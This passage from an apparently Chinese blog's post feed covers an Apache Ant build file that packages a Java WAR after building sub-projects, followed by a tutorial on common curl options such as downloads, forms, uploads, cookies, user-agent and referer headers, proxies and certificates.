class="attr">value</span>=<span class="string">"$&#123;build.dir.core&#125;\classes\someproject\tlds\"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">antcall</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"pager_path_core"</span> <span class="attr">location</span>=<span class="string">"$&#123;web.dir.core&#125;\WEB-INF\tlds\"</span> /&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"to_path_core"</span> <span class="attr">location</span>=<span class="string">"$&#123;build.dir.core&#125;\classes\someproject\tlds\"</span> /&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">echo</span>&gt;</span>-----------------------------------START-----------------------------------<span class="tag">&lt;/<span class="name">echo</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">echo</span>&gt;</span>($&#123;pager_path_core&#125;)-----------&gt;($&#123;to_path_core&#125;)<span class="tag">&lt;/<span class="name">echo</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">echo</span>&gt;</span>开始拷贝TLD文件<span class="tag">&lt;/<span class="name">echo</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">copy</span> <span class="attr">todir</span>=<span class="string">"$&#123;to_path_core&#125;"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">fileset</span> <span class="attr">dir</span>=<span class="string">"$&#123;pager_path_core&#125;"</span>&gt;</span></span><br><span class="line">          	<span class="tag">&lt;<span class="name">include</span> <span class="attr">name</span>=<span class="string">"*/**"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">fileset</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">copy</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">echo</span>&gt;</span>TLD文件拷贝结束<span class="tag">&lt;/<span class="name">echo</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">echo</span>&gt;</span>-------------------------------------END---------------------------------<span class="tag">&lt;/<span class="name">echo</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="打war包xml可运行其他jar包xml，然后打war包。"><a href="#打war包xml可运行其他jar包xml，然后打war包。" class="headerlink" title="打war包xml可运行其他jar包xml，然后打war包。"></a>打war包xml可运行其他jar包xml，然后打war包。</h2><p>互相依赖的关系，没有解决。如，A依赖B，B依赖A<br>作弊的方法是，已有A/Bjar包。<br>唉，这方法其实没啥记录的必要。熟悉下ant和maven好了。</p><pre><code class="xml">    <span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
    <span class="tag">&lt;<span class="name">project</span> <span class="attr">name</span>=<span class="string">"项目名"</span> <span class="attr">basedir</span>=<span class="string">"."</span> <span class="attr">default</span>=<span class="string">"main"</span>&gt;</span>
    <span class="comment">&lt;!-- 源文件目录 --&gt;</span>
    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"src.dir"</span> <span class="attr">value</span>=<span class="string">"src/main/java"</span> /&gt;</span>
    <span class="comment">&lt;!-- 编译jar文件目录 --&gt;</span>
    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"jar.dir"</span> <span class="attr">value</span>=<span class="string">"../compile_lib"</span> /&gt;</span>
    <span class="comment">&lt;!-- WEB文件目录 --&gt;</span>
    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"web.dir"</span> <span class="attr">value</span>=<span class="string">"src/main/webapp"</span> /&gt;</span>
    <span class="comment">&lt;!-- config || output address --&gt;</span>
    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"config.dev.dir"</span> <span class="attr">value</span>=<span class="string">"../config/dev"</span> /&gt;</span>
    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"config.dir"</span> <span class="attr">value</span>=<span class="string">"src/main/resource"</span> /&gt;</span>
    <span class="comment">&lt;!-- jar文件存放目录 --&gt;</span>
    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"dist.dir"</span> <span class="attr">value</span>=<span class="string">"../dist"</span> /&gt;</span>
    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"dist.dev.dir"</span> <span class="attr">value</span>=<span class="string">"../dist/dev"</span> /&gt;</span>
    <span class="comment">&lt;!-- 编译文件存放目录 --&gt;</span>
    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"build.dir"</span> <span class="attr">value</span>=<span class="string">"build"</span> /&gt;</span>
    <span class="comment">&lt;!-- 生成应用名 --&gt;</span>
    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"webapp.name"</span> <span class="attr">value</span>=<span class="string">"项目名"</span> /&gt;</span>
    <span class="tag">&lt;<span class="name">property</span> <span class="attr">environment</span>=<span class="string">"env"</span> /&gt;</span>
    <span class="tag">&lt;<span class="name">path</span> <span class="attr">id</span>=<span class="string">"classpath"</span>&gt;</span>
        <span class="tag">&lt;<span class="name">fileset</span> <span class="attr">dir</span>=<span class="string">"${jar.dir}"</span>&gt;</span>
            <span class="tag">&lt;<span class="name">include</span> <span class="attr">name</span>=<span class="string">"*.jar"</span> /&gt;</span>
        <span class="tag">&lt;/<span class="name">fileset</span>&gt;</span>
        <span class="tag">&lt;<span class="name">pathelement</span> <span class="attr">path</span>=<span class="string">"${build.dir}"</span> /&gt;</span>
    <span class="tag">&lt;/<span class="name">path</span>&gt;</span>    
    <span class="comment">&lt;!-- 构建子工程XXXX任务 --&gt;</span>
    <span class="tag">&lt;<span class="name">target</span> <span class="attr">name</span>=<span class="string">"子工程"</span>&gt;</span>
        <span class="tag">&lt;<span class="name">echo</span> <span class="attr">message</span>=<span class="string">"构建子工程「XXXX」！"</span>/&gt;</span>
        <span class="tag">&lt;<span class="name">ant</span>  <span class="attr">dir</span>=<span class="string">"../XXXX"</span>/&gt;</span>
    <span class="tag">&lt;/<span class="name">target</span>&gt;</span>    
    <span class="comment">&lt;!-- 生成war包 命令: ant -buildfile build.xml --&gt;</span>
    <span class="tag">&lt;<span class="name">target</span> <span class="attr">name</span>=<span class="string">"RUN_PACKAGE"</span> <span class="attr">depends</span>=<span class="string">"子工程,子工程2"</span> <span class="attr">description</span>=<span class="string">"Packages app as WAR"</span>&gt;</span>
        <span class="tag">&lt;<span class="name">echo</span> <span class="attr">message</span>=<span class="string">"正在清空编译目录，生成目录..."</span>/&gt;</span>
        <span class="tag">&lt;<span class="name">delete</span> <span class="attr">dir</span>=<span class="string">"${build.dir}/classes"</span>/&gt;</span>
        <span class="tag">&lt;<span class="name">delete</span> <span class="attr">dir</span>=<span class="string">"${build.dir}/lib"</span>/&gt;</span>
        <span class="tag">&lt;<span class="name">delete</span> <span class="attr">file</span>=<span class="string">"${dist.dir}/${webapp.name}.war"</span>/&gt;</span>
        <span class="tag">&lt;<span class="name">echo</span> <span class="attr">message</span>=<span class="string">"正在创建编译目录...."</span>/&gt;</span>
        <span class="tag">&lt;<span class="name">mkdir</span> <span class="attr">dir</span>=<span class="string">"${build.dir}/classes"</span> /&gt;</span>
        <span class="tag">&lt;<span class="name">javac</span> <span class="attr">destdir</span>=<span class="string">"${build.dir}/classes"</span> <span class="attr">debug</span>=<span class="string">"false"</span> <span class="attr">deprecation</span>=<span class="string">"false"</span> <span class="attr">optimize</span>=<span class="string">"true"</span> <span class="attr">failonerror</span>=<span class="string">"true"</span>&gt;</span>
            <span class="tag">&lt;<span class="name">compilerarg</span> <span class="attr">line</span>=<span class="string">"-encoding UTF-8"</span>/&gt;</span>
            <span class="tag">&lt;<span class="name">src</span> <span class="attr">path</span>=<span class="string">"${src.dir}"</span>/&gt;</span>
            <span class="tag">&lt;<span class="name">classpath</span> <span class="attr">refid</span>=<span class="string">"classpath"</span> /&gt;</span>
        <span class="tag">&lt;/<span class="name">javac</span>&gt;</span>
        <span class="tag">&lt;<span class="name">echo</span> <span class="attr">message</span>=<span class="string">"正在编译文件目录...."</span>/&gt;</span>
        <span class="comment">&lt;!-- Copy config files to ${build.dir}/classes --&gt;</span>
        <span class="tag">&lt;<span class="name">copy</span> <span class="attr">todir</span>=<span class="string">"${build.dir}/classes"</span>&gt;</span>
            <span class="tag">&lt;<span class="name">fileset</span> <span class="attr">dir</span>=<span class="string">"${config.dir}"</span> <span class="attr">includes</span>=<span class="string">"**/*.*"</span> /&gt;</span>
        <span class="tag">&lt;/<span class="name">copy</span>&gt;</span>
        <span class="tag">&lt;<span class="name">copy</span> <span class="attr">todir</span>=<span class="string">"${build.dir}/classes"</span>&gt;</span>
            <span class="tag">&lt;<span class="name">fileset</span> <span class="attr">dir</span>=<span class="string">"${src.dir}"</span> <span class="attr">includes</span>=<span class="string">"**/*.*"</span> <span class="attr">excludes</span>=<span class="string">"**/*.java"</span> /&gt;</span>
        <span class="tag">&lt;/<span class="name">copy</span>&gt;</span>
        <span class="tag">&lt;<span class="name">copy</span> <span class="attr">todir</span>=<span class="string">"${build.dir}/lib"</span>&gt;</span>
            <span class="tag">&lt;<span class="name">fileset</span> <span class="attr">dir</span>=<span class="string">"${jar.dir}"</span> <span class="attr">includes</span>=<span class="string">"**/*.*"</span> /&gt;</span>
        <span class="tag">&lt;/<span class="name">copy</span>&gt;</span>
        <span class="tag">&lt;<span class="name">echo</span> <span class="attr">message</span>=<span class="string">"正在生成WAR包..."</span>/&gt;</span>
        <span class="tag">&lt;<span class="name">war</span> <span class="attr">destfile</span>=<span class="string">"${dist.dir}/${webapp.name}.war"</span> <span class="attr">webxml</span>=<span class="string">"${web.dir}/WEB-INF/web.xml"</span>&gt;</span>
            <span class="tag">&lt;<span class="name">classes</span> <span class="attr">dir</span>=<span class="string">"${build.dir}/classes"</span> /&gt;</span>
            <span class="tag">&lt;<span class="name">lib</span> <span class="attr">dir</span>=<span class="string">"${build.dir}/lib"</span> /&gt;</span>
            <span class="tag">&lt;<span class="name">fileset</span> <span class="attr">dir</span>=<span class="string">"${web.dir}"</span>&gt;</span>
                <span class="tag">&lt;<span class="name">include</span> <span class="attr">name</span>=<span class="string">"**/*.*"</span> /&gt;</span>
                <span class="tag">&lt;<span class="name">exclude</span> <span class="attr">name</span>=<span class="string">"**/classes/**/*.*"</span>/&gt;</span>
                <span class="tag">&lt;<span class="name">exclude</span> <span class="attr">name</span>=<span class="string">"**/web.xml"</span> /&gt;</span>
            <span class="tag">&lt;/<span class="name">fileset</span>&gt;</span>
        <span class="tag">&lt;/<span class="name">war</span>&gt;</span>
        <span class="tag">&lt;<span class="name">echo</span> <span class="attr">message</span>=<span class="string">"清理相关编译文件..."</span>/&gt;</span>
        <span class="tag">&lt;<span class="name">delete</span> <span class="attr">dir</span>=<span class="string">"${build.dir}/classes"</span>/&gt;</span>
        <span class="tag">&lt;<span class="name">delete</span> <span class="attr">dir</span>=<span class="string">"${build.dir}/lib"</span>/&gt;</span>
    <span class="tag">&lt;/<span class="name">target</span>&gt;</span>
    <span class="tag">&lt;<span class="name">target</span> <span class="attr">name</span>=<span class="string">"DEV"</span> <span class="attr">depends</span>=<span class="string">"子工程,子工程2"</span> <span class="attr">description</span>=<span class="string">"Packages app as WAR  DEV"</span>&gt;</span>
        <span class="tag">&lt;<span class="name">echo</span> <span class="attr">message</span>=<span class="string">"正在清空编译目录，生成目录..."</span>/&gt;</span>
        <span class="tag">&lt;<span class="name">delete</span> <span class="attr">dir</span>=<span class="string">"${build.dir}/classes"</span>/&gt;</span>
        <span class="tag">&lt;<span class="name">delete</span> <span class="attr">dir</span>=<span class="string">"${build.dir}/lib"</span>/&gt;</span>
        <span class="tag">&lt;<span class="name">delete</span> <span class="attr">file</span>=<span class="string">"${dist.dev.dir}/${webapp.name}.war"</span>/&gt;</span>
        <span class="tag">&lt;<span class="name">echo</span> <span class="attr">message</span>=<span class="string">"正在创建编译目录...."</span>/&gt;</span>
        <span class="tag">&lt;<span class="name">mkdir</span> <span class="attr">dir</span>=<span class="string">"${build.dir}/classes"</span> /&gt;</span>
        <span class="tag">&lt;<span class="name">javac</span> <span class="attr">destdir</span>=<span class="string">"${build.dir}/classes"</span> <span class="attr">debug</span>=<span class="string">"false"</span> <span class="attr">deprecation</span>=<span class="string">"false"</span> <span class="attr">optimize</span>=<span class="string">"true"</span> <span class="attr">failonerror</span>=<span class="string">"true"</span>&gt;</span>
            <span class="tag">&lt;<span class="name">compilerarg</span> <span class="attr">line</span>=<span class="string">"-encoding UTF-8"</span>/&gt;</span>
            <span class="tag">&lt;<span class="name">src</span> <span class="attr">path</span>=<span class="string">"${src.dir}"</span>/&gt;</span>
            <span class="tag">&lt;<span class="name">classpath</span> <span class="attr">refid</span>=<span class="string">"classpath"</span> /&gt;</span>
        <span class="tag">&lt;/<span class="name">javac</span>&gt;</span>
        <span class="tag">&lt;<span class="name">echo</span> <span class="attr">message</span>=<span class="string">"正在编译文件目录...."</span>/&gt;</span>
        <span class="comment">&lt;!-- Copy config files to ${build.dir}/classes --&gt;</span>
        <span class="tag">&lt;<span class="name">copy</span> <span class="attr">todir</span>=<span class="string">"${build.dir}/classes"</span>&gt;</span>
            <span class="tag">&lt;<span class="name">fileset</span> <span class="attr">dir</span>=<span class="string">"${config.dev.dir}"</span> <span class="attr">includes</span>=<span class="string">"**/*.*"</span>/&gt;</span>
        <span class="tag">&lt;/<span class="name">copy</span>&gt;</span>
        <span class="tag">&lt;<span class="name">copy</span> <span class="attr">todir</span>=<span class="string">"${build.dir}/classes"</span>&gt;</span>
            <span class="tag">&lt;<span class="name">fileset</span> <span class="attr">dir</span>=<span class="string">"${config.dir}"</span> <span class="attr">includes</span>=<span class="string">"**/*.*"</span> /&gt;</span>
        <span class="tag">&lt;/<span class="name">copy</span>&gt;</span>
        <span class="tag">&lt;<span class="name">copy</span> <span class="attr">todir</span>=<span class="string">"${build.dir}/classes"</span>&gt;</span>
            <span class="tag">&lt;<span class="name">fileset</span> <span class="attr">dir</span>=<span class="string">"${src.dir}"</span> <span class="attr">includes</span>=<span class="string">"**/*.*"</span> <span class="attr">excludes</span>=<span class="string">"**/*.java"</span> /&gt;</span>
        <span class="tag">&lt;/<span class="name">copy</span>&gt;</span>
        <span class="tag">&lt;<span class="name">copy</span> <span class="attr">todir</span>=<span class="string">"${build.dir}/lib"</span>&gt;</span>
            <span class="tag">&lt;<span class="name">fileset</span> <span class="attr">dir</span>=<span class="string">"${jar.dir}"</span> <span class="attr">includes</span>=<span class="string">"**/*.*"</span> /&gt;</span>
        <span class="tag">&lt;/<span class="name">copy</span>&gt;</span>
        <span class="tag">&lt;<span class="name">echo</span> <span class="attr">message</span>=<span class="string">"正在生成WAR包..."</span>/&gt;</span>
        <span class="tag">&lt;<span class="name">war</span> <span class="attr">destfile</span>=<span class="string">"${dist.dev.dir}/${webapp.name}.war"</span> <span class="attr">webxml</span>=<span class="string">"${web.dir}/WEB-INF/web.xml"</span>&gt;</span>
            <span class="tag">&lt;<span class="name">classes</span> <span class="attr">dir</span>=<span class="string">"${build.dir}/classes"</span> /&gt;</span>
            <span class="tag">&lt;<span class="name">lib</span> <span class="attr">dir</span>=<span class="string">"${build.dir}/lib"</span> /&gt;</span>
            <span class="tag">&lt;<span class="name">fileset</span> <span class="attr">dir</span>=<span class="string">"${web.dir}"</span>&gt;</span>
                <span class="tag">&lt;<span class="name">include</span> <span class="attr">name</span>=<span class="string">"**/*.*"</span> /&gt;</span>
                <span class="tag">&lt;<span class="name">exclude</span> <span class="attr">name</span>=<span class="string">"**/classes/**/*.*"</span>/&gt;</span>
                <span class="tag">&lt;<span class="name">exclude</span> <span class="attr">name</span>=<span class="string">"**/web.xml"</span> /&gt;</span>
            <span class="tag">&lt;/<span class="name">fileset</span>&gt;</span>
        <span class="tag">&lt;/<span class="name">war</span>&gt;</span>
        <span class="tag">&lt;<span class="name">echo</span> <span class="attr">message</span>=<span class="string">"清理相关编译文件..."</span>/&gt;</span>
        <span class="tag">&lt;<span class="name">delete</span> <span class="attr">dir</span>=<span class="string">"${build.dir}/classes"</span>/&gt;</span>
        <span class="tag">&lt;<span class="name">delete</span> <span class="attr">dir</span>=<span class="string">"${build.dir}/lib"</span>/&gt;</span>
    <span class="tag">&lt;/<span class="name">target</span>&gt;</span>
    <span class="comment">&lt;!-- 默认任务 --&gt;</span>
    <span class="tag">&lt;<span class="name">target</span> <span class="attr">name</span>=<span class="string">"main"</span> <span class="attr">depends</span>=<span class="string">"RUN_PACKAGE"</span>/&gt;</span>
<span class="tag">&lt;/<span class="name">project</span>&gt;</span>
</code></pre>]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>maven</tag>
      </tags>
  </entry>
  <entry>
    <title>使用URL命令工具curl</title>
    <url>/2016/04/25/use-url-client-curl/</url>
    <content><![CDATA[<h2 id="简单介绍CURL"><a href="#简单介绍CURL" class="headerlink" title="简单介绍CURL"></a>简单介绍CURL</h2><p><a href="https://curl.haxx.se/">curl</a> 是一款非常强大的支持URL语法传输数据的开源命令行工具和库，可以用它发起网络请求，输出返回的数据。支持各种操作系统，支持各种协议包括DICT, FILE, FTP, FTPS, Gopher, HTTP, HTTPS, IMAP, IMAPS, LDAP, LDAPS, POP3, POP3S, RTMP, RTSP, SCP, SFTP, SMB, SMTP, SMTPS, Telnet and TFTP. curl supports SSL certificates, HTTP POST, HTTP PUT, FTP uploading, HTTP form based upload, proxies, HTTP/2, cookies, user+password authentication (Basic, Plain, Digest, CRAM-MD5, NTLM, Negotiate and Kerberos), file transfer resume, proxy tunneling 以及更多。</p><p>最新下载地址，<a href="https://curl.haxx.se/download.html">摸这里</a></p><h2 id="常用curl命令"><a href="#常用curl命令" class="headerlink" title="常用curl命令"></a>常用curl命令</h2><h3 id="获取网页"><a href="#获取网页" class="headerlink" title="获取网页"></a>获取网页</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl yzhe.ml</span><br></pre></td></tr></table></figure><h3 id="获取网页并保存，下载文件-o-，FTP-下载-O-，显示进度-，续传-c-，分块下载-r"><a href="#获取网页并保存，下载文件-o-，FTP-下载-O-，显示进度-，续传-c-，分块下载-r" class="headerlink" title="获取网页并保存，下载文件 -o ，FTP 下载 -O ，显示进度 -# ，续传 -c ，分块下载 -r"></a>获取网页并保存，下载文件 -o ，FTP 下载 -O ，显示进度 -# ，续传 -c ，分块下载 -r</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -o 文件名 地址</span><br><span class="line">curl -o result.html http://www.baidu.com</span><br><span class="line"><span class="meta">#</span><span class="bash">fetch all the categories from 00 to 99</span></span><br><span class="line">curl -o 'category-#1#2.html' 'http://www.example.com/category.php?CATID=[0-9][0-9]'</span><br><span class="line">curl -o 'category-#1.html' 'http://www.example.com/category.php?CATID=[0-99]'</span><br><span class="line"><span class="meta">#</span><span class="bash">fetch several main pages and store them <span class="keyword">in</span> files named accordingly</span></span><br><span class="line">curl -o '#1.html' 'http://www.example.com/&#123;news,blog,careers,contact,sitemap&#125;/'</span><br><span class="line">curl -o '#1-#2-#3-#4.html'/ "http://www.example.com/cgi0bin/item.cgi?prod=[0001-9999]&amp;cat=[0-9]&amp;color=&#123;red,yellow,blue,green&#125;&amp;size=&#123;s,m,l,xl&#125;"</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">fetch a file by FTP have curl automatically pick the output filename将下载的文件保存到file.zip中</span></span><br><span class="line">curl -O ftp://ftp.example.com/pub/download/file.zip</span><br><span class="line">curl -u name:passwd -O ftp://ip:port/path/file</span><br><span class="line">curl -O ftp://name:passwd@ip:port/path/file</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 下载file.zip中，格式任意，突然掉线，文件续传</span></span></span><br><span class="line">curl -c -O 地址/file.zip</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 分块下载 ，一个文件file.zip，格式任意</span></span></span><br><span class="line">curl -r 0-10240 -o "file.part1" 地址file1.zip &amp;\</span><br><span class="line">curl -r 10241-20480 -o "file.part2" 地址file1.zip &amp;\</span><br><span class="line">curl -r 20481-40960 -o "file.part3" 地址file1.zip &amp;\</span><br><span class="line">curl -r 40961- -o "file.part4" 地址zhao1.zip</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#合并文件 UNIX或苹果，用 </span></span></span><br><span class="line">cat file.part* &gt; file.zip</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#合并文件 Windows copy /b表示以二进制的形式合并 可以使用通配符（?或者*）</span></span></span><br><span class="line">copy /b file.part* file.zip</span><br><span class="line">copy /b file.part1+file.part2+file.part3+file.part4 file.zip</span><br><span class="line">或者</span><br><span class="line">type file.part* &gt; file.zip</span><br></pre></td></tr></table></figure><h3 id="显示HTTP-RESPONSE头信息-i"><a href="#显示HTTP-RESPONSE头信息-i" class="headerlink" title="显示HTTP RESPONSE头信息 -i"></a>显示HTTP RESPONSE头信息 -i</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -i 地址</span><br></pre></td></tr></table></figure><h3 id="只显示HTTP-RESPONSE头信息-I"><a href="#只显示HTTP-RESPONSE头信息-I" class="headerlink" title="只显示HTTP RESPONSE头信息 -I"></a>只显示HTTP RESPONSE头信息 -I</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -I 地址</span><br></pre></td></tr></table></figure><h3 id="显示完整HTTP通信过程-v"><a href="#显示完整HTTP通信过程-v" class="headerlink" title="显示完整HTTP通信过程 -v"></a>显示完整HTTP通信过程 -v</h3><p>-v参数可以显示一次http通信的整个过程，包括端口连接、http request/response头信息和HTML源码。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -v 地址</span><br></pre></td></tr></table></figure><h3 id="把更详细的结果保存在指定的文件中-–trace"><a href="#把更详细的结果保存在指定的文件中-–trace" class="headerlink" title="把更详细的结果保存在指定的文件中 –trace"></a>把更详细的结果保存在指定的文件中 –trace</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl --trace test.txt 地址</span><br><span class="line">curl --trace-ascii test.txt 地址</span><br></pre></td></tr></table></figure><p>打开test.txt即可查看详细结果。</p><h3 id="发送表单信息-POST-d-，表单编码–data-urlencode"><a href="#发送表单信息-POST-d-，表单编码–data-urlencode" class="headerlink" title="发送表单信息 POST -d ，表单编码–data-urlencode"></a>发送表单信息 POST -d ，表单编码–data-urlencode</h3><p>GET 方式</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl 地址?keyword=词</span><br></pre></td></tr></table></figure><p>注：zsh下需要在url两边加单引号</p><p>如果发送的表单为POST，则需要使用-d参数</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -d "name=xxx&amp;password=xxx" 地址</span><br><span class="line">curl -o output.html -d "userid=root" -d "passwd=fluffy" / -d "submit=Login" -d @formstate.txt /  http://www.example.com/servlet/login.do</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#将参数名及取值都存储在文件中。然后，在命令行上，使用@来引用它</span></span></span><br></pre></td></tr></table></figure><p>使用–data-urlencode参数，curl可以为你的表单编码。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl --data-urlencode "name=xxx&amp;password=xxx"  地址</span><br></pre></td></tr></table></figure><h3 id="HTTP动词-检测不安全的HTTP方法-X"><a href="#HTTP动词-检测不安全的HTTP方法-X" class="headerlink" title="HTTP动词(检测不安全的HTTP方法) -X"></a>HTTP动词(检测不安全的HTTP方法) -X</h3><p>使用-X参数，curl就可以支持其它HTTP动词，比如 OPTIONS<br>可以用来检测不安全的HTTP方法</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -X OPTIONS 地址</span><br></pre></td></tr></table></figure><h3 id="文件上传-F"><a href="#文件上传-F" class="headerlink" title="文件上传 -F"></a>文件上传 -F</h3><p>使用-F参数可实现文件上传，curl 就会以multipart/form-data的方式发送 POST 请求。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -F "action=upload" -F "filename=@file.tar.gz" 地址</span><br><span class="line"></span><br><span class="line">curl -F upload=@localfilename -F press=OK 地址</span><br></pre></td></tr></table></figure><h3 id="模拟referer-e或者–referer"><a href="#模拟referer-e或者–referer" class="headerlink" title="模拟referer -e或者–referer"></a>模拟referer -e或者–referer</h3><p>想要验证网站的防盗链，可以尝试模拟referer，使用-e或者 –referer 命令<br>认为从地址A过来</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -e "地址A" "地址B"</span><br></pre></td></tr></table></figure><h3 id="模拟浏览器信息user-agent-–user-agent-A"><a href="#模拟浏览器信息user-agent-–user-agent-A" class="headerlink" title="模拟浏览器信息user-agent –user-agent -A"></a>模拟浏览器信息user-agent –user-agent -A</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl --user-agent '想仿造的user-agent' 地址</span><br><span class="line">chrome</span><br><span class="line">Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.87 Safari/537.36</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#使用cURL模仿搜索引擎</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash">fetch as Google,Get the article content</span></span><br><span class="line">curl -o curl-google.html -A / 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)' / http://www.linux-mag.com/id/744/</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#需要这样获取页面并确保没有机密信息被泄露给搜索引擎http://www.linux-mag.com/id/744/服务器使用user-agent字符串来区分google和普通浏览器，google将自己标记为“Googlebot”。该服务器保存对 ogle和yahoo这类搜索引擎的可见性，但是要求普通用户在付费或注册后才能查看其内容</span></span></span><br></pre></td></tr></table></figure><p>user-agent是访问者的设备，包括系统、CPU、浏览器版本等等.</p><h3 id="保存cookie-b-D，发送cookie-c"><a href="#保存cookie-b-D，发送cookie-c" class="headerlink" title="保存cookie -b -D，发送cookie -c"></a>保存cookie -b -D，发送cookie -c</h3><p>-b选项确定在会话开始时到哪里读取cookie<br>-c选项指出在哪里写入在会话中接收到的cookie<br>cookie信息也被存到了cookie0001.txt,cookie信息追加到http request里面去： -b</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -D cookie0002.txt -b cookie0001.txt 地址</span><br><span class="line"></span><br><span class="line">curl -b file_name 地址</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#保持会话状态</span></span></span><br><span class="line">curl -b cookies.txt -c newcookies.txt 地址</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#发送假造的cookie</span></span></span><br><span class="line">curl -b session-id-time=-1 地址</span><br></pre></td></tr></table></figure><h3 id="加密HTTP和HTTPS-E-xx-pem-–cert"><a href="#加密HTTP和HTTPS-E-xx-pem-–cert" class="headerlink" title="加密HTTP和HTTPS -E xx.pem ,–cert"></a>加密HTTP和HTTPS -E xx.pem ,–cert</h3><p>curl 可以直接访问https的网站<br>如果是采用证书认证的http地址，证书在本地，那么curl这样使用：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -E mycert.pem https://地址</span><br></pre></td></tr></table></figure><h3 id="略过https证书访问-k"><a href="#略过https证书访问-k" class="headerlink" title="略过https证书访问 -k,"></a>略过https证书访问 -k,</h3><p>通过SSL/TLS获取页面时忽略它不能验证SSL证书</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -k https://地址</span><br><span class="line">curl https://地址 --insecure</span><br></pre></td></tr></table></figure><h3 id="显示抓取错误-f"><a href="#显示抓取错误-f" class="headerlink" title="显示抓取错误 -f"></a>显示抓取错误 -f</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -f http://www.baidu.com</span><br></pre></td></tr></table></figure><h3 id="在给定端口上使用http代理-x"><a href="#在给定端口上使用http代理-x" class="headerlink" title="在给定端口上使用http代理 -x"></a>在给定端口上使用http代理 -x</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -x 127.0.0.1:8088 地址</span><br></pre></td></tr></table></figure><h3 id="上传文件-T"><a href="#上传文件-T" class="headerlink" title="上传文件 -T"></a>上传文件 -T</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># FTP上传</span></span></span><br><span class="line">curl -T localfile -u name:passwd ftp://upload_site:port/path/</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># HTTP上传的PUT method</span></span></span><br><span class="line">curl -T localfile http://地址</span><br></pre></td></tr></table></figure><h3 id="通过dict协议去查字典"><a href="#通过dict协议去查字典" class="headerlink" title="通过dict协议去查字典"></a>通过dict协议去查字典</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl dict://dict.org/d:computer</span><br></pre></td></tr></table></figure><h2 id="CURL其他参数"><a href="#CURL其他参数" class="headerlink" title="CURL其他参数"></a>CURL其他参数</h2><p><a href="https://curl.haxx.se/docs/manpage.html">curl所有参数</a></p><p>-a/–append 上传文件时，附加到目标文件<br>-A/–user-agent<string>设置用户代理发送给服务器</string></p><ul><li>anyauth 可以使用“任何”身份验证方法</li><li>b/–cookie &lt;name=string/file&gt; cookie字符串或文件读取位置</li><li>basic 使用HTTP基本验证</li><li>B/–use-ascii 使用ASCII /文本传输</li><li>c/–cookie-jar<file>操作结束后把cookie写入到这个文件中</file></li><li>C/–continue-at<offset>断点续转</offset></li><li>d/–data<data>HTTP 